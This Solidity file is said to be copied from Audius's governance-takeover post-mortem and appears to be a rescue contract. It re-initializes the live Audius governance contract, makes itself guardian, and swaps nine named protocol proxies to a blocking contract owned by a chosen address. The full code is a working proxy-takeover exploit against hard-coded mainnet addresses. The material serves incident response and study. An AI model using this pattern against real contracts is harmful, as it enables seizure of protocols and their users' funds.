// Copied from https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22
pragma solidity 0.8.15;

contract AudiusAdminUpgradeabilityProxy {
    address private proxyAdmin;

    function getAudiusProxyAdminAddress() external view returns (address) {
        return proxyAdmin;
    }
}

interface GovernanceLike {
    function initialize(
        address _registryAddress,
        uint256 _votingPeriod,
        uint256 _executionDelay,
        uint256 _votingQuorumPercent,
        uint16 _maxInProgressProposals,
        address _guardianAddress
    )
        external;

    function guardianExecuteTransaction(
        bytes32 _targetContractRegistryKey,
        uint256 _callValue,
        string calldata _functionSignature,
        bytes calldata _callData
    )
        external;
}

contract MockRegistry {
    address private targetContract;

    constructor(address targetContract_) {
        targetContract = targetContract_;
    }

    function getContract(bytes32) external view returns (address) {
        return targetContract;
    }
}

contract BlockingContract {
    address private immutable deployer = msg.sender;

    address public proxyOwner;

    uint256 private gap;

    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private initializing;

    function fixStorage(address newOwner) external {
        require(msg.sender == deployer, "not deployer");

        proxyOwner = newOwner;

        initialized = true;
        initializing = false;
    }

    function setStorage(uint256 slot, bytes32 value) external {
        require(msg.sender == deployer || msg.sender == proxyOwner, "not owner");

        assembly {
            sstore(slot, value)
        }
    }

    function exec(address to, bytes calldata data) external {
        require(msg.sender == deployer || msg.sender == proxyOwner, "not owner");

        (bool ok,) = to.call(data);
        require(ok, "not ok");
    }
}

contract SaveTheFunds {
    constructor(address newOwner) {
        BlockingContract blocker = new BlockingContract();

        GovernanceLike governance =
            GovernanceLike(0x4DEcA517D6817B6510798b7328F2314d3003AbAC);
        governance.initialize(
            address(new MockRegistry(address(governance))),
            3,
            0,
            1,
            4,
            address(this)
        );
        governance.guardianExecuteTransaction(
            bytes32(0x00),
            0,
            "setAudiusProxyAdminAddress(address)",
            abi.encode(address(governance))
        );
        governance.guardianExecuteTransaction(
            bytes32(0x00), 0, "upgradeTo(address)", abi.encode(blocker)
        );

        BlockingContract(address(governance)).fixStorage(newOwner);
        require(
            newOwner
                == AudiusAdminUpgradeabilityProxy(address(governance))
                    .getAudiusProxyAdminAddress(),
            "it didn't work"
        );

        fixProxy(
            governance,
            blocker,
            newOwner,
            0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998
        ); // token
        fixProxy(
            governance,
            blocker,
            newOwner,
            0xe6D97B2099F142513be7A2a068bE040656Ae4591
        ); // staking
        fixProxy(
            governance,
            blocker,
            newOwner,
            0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225
        ); // delegatemanager
        fixProxy(
            governance,
            blocker,
            newOwner,
            0x44617F9dCEd9787C3B06a05B35B4C779a2AA1334
        ); // claimsmanager
        fixProxy(
            governance,
            blocker,
            newOwner,
            0xD17A9bc90c582249e211a4f4b16721e7f65156c8
        ); // sp factory
        fixProxy(
            governance,
            blocker,
            newOwner,
            0x5aa6B99A2B461bA8E97207740f0A689C5C39C3b0
        ); // eth rewards manager
        fixProxy(
            governance,
            blocker,
            newOwner,
            0x6f08105c8CEef2BC5653640fcdbBE1e7bb519D39
        ); // trusted notifier
        fixProxy(
            governance,
            blocker,
            newOwner,
            0x9EfB0f4F38aFbb4b0984D00C126E97E21b8417C5
        ); // service type manager
        fixProxy(
            governance,
            blocker,
            newOwner,
            0x6E7a1F7339bbB62b23D44797b63e4258d283E095
        ); // wormhole client

        selfdestruct(payable(msg.sender));
    }

    function fixProxy(
        GovernanceLike governance,
        BlockingContract blocker,
        address newOwner,
        address proxy
    )
        private
    {
        BlockingContract(address(governance)).exec(
            proxy, abi.encodeWithSignature("upgradeTo(address)", blocker)
        );
        BlockingContract(address(proxy)).fixStorage(newOwner);

        require(
            newOwner == AudiusAdminUpgradeabilityProxy(proxy).getAudiusProxyAdminAddress(),
            "it didn't work"
        );
    }
}
